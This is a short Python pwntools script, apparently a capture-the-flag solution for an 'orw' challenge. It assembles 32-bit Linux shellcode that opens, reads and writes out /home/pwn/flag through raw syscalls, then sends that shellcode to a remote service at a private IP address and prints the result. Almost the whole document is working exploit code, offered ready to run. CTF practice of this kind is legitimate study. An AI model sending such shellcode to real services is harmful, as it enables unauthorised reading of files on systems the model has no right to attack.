from pwn import *
context(arch = 'i386',os='linux')
context.log_level='debug'

# http://syscalls.kernelgrok.com/
# 将 /home/pwn/flag 压栈
# system call: open 
# system call: read
# system call: write
# system call: exit

code='''
.code32
	jmp end
hack:
	pop ebx
	xor ecx,ecx
	xor edx,edx
	mov eax,0x5
	int 0x80

	mov ebx,eax
	mov eax,0x3
	sub esp,0x30
	mov ecx,esp
	mov edx,0x30
	int 0x80

	mov eax,0x4
	mov ebx,0x1
	int 0x80

	mov eax,0x1
	int 0x80
	
end:
	call hack
	.ascii "/home/pwn/flag"
	.byte 0
'''
shellcode=asm(code)
conn=remote('10.131.1.19',60002)
# conn=process("./orw")
print conn.recvuntil(':')
conn.send(shellcode)
print conn.recv()


